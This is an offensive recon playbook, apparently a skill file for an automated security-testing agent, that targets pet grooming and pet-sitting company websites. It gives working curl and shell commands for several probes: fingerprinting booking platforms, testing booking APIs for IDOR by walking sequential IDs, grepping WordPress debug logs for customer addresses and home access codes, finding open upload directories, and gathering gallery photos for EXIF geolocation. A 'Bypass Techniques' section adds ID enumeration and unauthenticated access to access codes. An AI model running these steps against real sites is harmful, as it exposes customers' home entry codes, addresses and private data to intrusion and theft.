---
name: recon-pet-grooming
description: "Sector-specific recon for pet grooming, pet care, and dog walking company websites — typically WordPress on shared hosting with online booking, service menus, customer portals with pet profiles, and photo galleries. Common platforms include Gingr, PetExec, TimeToPet, PrecisePet for scheduling, and Rover/Wag! integration for pet-sitting."
sources: field_recon, web_recon
report_count: 3
---

# RECON-PET-GROOMING — Sector-Specific Recon for Pet Grooming & Pet Care Sites

## When to Use

Use when the target scope includes pet grooming salons, pet care, dog walking, pet sitting, or boarding kennel company domains. These small businesses typically have WordPress or custom PHP sites with online booking portals that store sensitive customer data (owner names, addresses, phone numbers, home access codes, pet medical info). Common findings: debug log with customer/pet PII, booking IDOR exposing other customers' appointment details, photo galleries with EXIF geolocation, and weak authentication on client portals.

## Quick Reference

- **Common CMS**: WordPress (dominant), Wix, Squarespace
- **Common platforms**: Gingr, PetExec, TimeToPet, PrecisePet, Rover, Wag!, KennelBooker
- **Key endpoints**: `/book`, `/booking`, `/services`, `/pricing`, `/grooming`, `/pet-profiles`, `/portal`, `/client-login`
- **Key findings**: Booking API IDOR exposing customer PII and pet medical info, Debug log with home access codes, CORS credential reflection

## Step-by-Step

1. **Platform Fingerprinting**
   ```bash
   # Gingr — look for gingrapp.com or gingr references
   curl -sk "https://$TARGET/" | grep -iE "gingr|petexec|timetopet|precisepet|kennelbooker"
   # Rover/Wag integration
   curl -sk "https://$TARGET/" | grep -iE "rover\.com|wagwalking"
   ```

2. **Booking API Recon**
   ```bash
   for path in "/api/bookings" "/api/appointments" "/api/booking" "/api/schedule"; do
     curl -sk "https://$TARGET$path" | jq '.' 2>/dev/null | head -20
   done
   # IDOR test on booking IDs
   curl -sk "https://$TARGET/api/bookings/1" | jq '.' 2>/dev/null
   ```

3. **Customer PII Discovery**
   ```bash
   # Debug log — often contains pet owner contact info and home access codes
   curl -sk "https://$TARGET/wp-content/debug.log" | grep -iE "name|address|access.code|gate.code|pet.name|medical|allergy" | head -30

   # Contact form with pet intake forms
   for path in /wp-content/uploads/wpforms/ /wp-content/uploads/gravity_forms/; do
     body=$(curl -sk "https://$TARGET$path" 2>/dev/null)
     if echo "$body" | grep -q "Index of"; then
       echo "[!!!] DIR LISTING: $path"
       echo "$body" | grep -oP 'href="[^\"]+\.(csv|xlsx|txt|pdf)"' | head -20
     fi
   done
   ```

4. **Photo Gallery Probe**
   ```bash
   # Pet photo galleries often contain EXIF data with geolocation
   curl -sk "https://$TARGET/gallery" | grep -oP 'src="[^\"]+\.(jpg|jpeg|png)"' | \
     sed 's/src="//;s/"//' | head -10
   ```

5. **Vulnerability Scan**
   ```bash
   for plugin in "bookly-responsive-appointment-booking-tool" "wpforms" \
     "elementor" "elementskit" "woocommerce" "wordpress-seo"; do
     route=$(curl -sk -o /dev/null -w "%{http_code}" "https://$TARGET/wp-content/plugins/$plugin/readme.txt")
     [ "$route" != "404" ] && echo "[+] Plugin: $plugin"
   done
   ```

## Attack Surface Signals

- WordPress + booking platforms (Gingr, PetExec, TimeToPet)
- Client portals with pet profiles (owner name, address, phone, pet name, breed, vet info, home access codes)
- Photo galleries of groomed pets with geolocation EXIF data
- Online booking systems with numeric appointment IDs (IDOR candidates)
- Third-party platform API keys in JS bundles

## Common Root Causes

1. **Booking API without ownership check** — Appointment and customer profile data accessible with sequential IDs
2. **Home access codes in debug logs** — Pet sitters need house keys/codes → stored in plaintext in logs
3. **Pet medical info leakage** — Vaccination records, allergy information, and vet contacts exposed via form uploads
4. **Photo gallery directory listing** — Before/after grooming photos with EXIF data
5. **Third-party platform API keys** — Gingr/Rover API tokens hardcoded in JS bundles

## Related Skills

- **recon-salons** — Overlapping booking platform profile
- **recon-smb-services** — General SMB recon methodology
- **recon-gyms** — Similar scheduling platform patterns
- **hunt-wordpress** — Primary CMS for pet grooming sites
- **hunt-idor** — Booking/customer IDOR is the primary finding
- **hunt-source-leak** — API keys in JS bundles and config files

## Bypass Techniques

- Booking platforms often expose appointment data via API endpoints with sequential numeric IDs — try `/api/bookings/1`, `/2`, `/3`
- Home access codes for pet sitters are often stored in customer profile fields accessible without auth
- Pet photo gallery pages may have directory listing enabled — check `/wp-content/uploads/`
- Google dork: `site:target.com inurl:wp-content/uploads filetype:pdf grooming`
- Staging/dev subdomains often have more permissive access
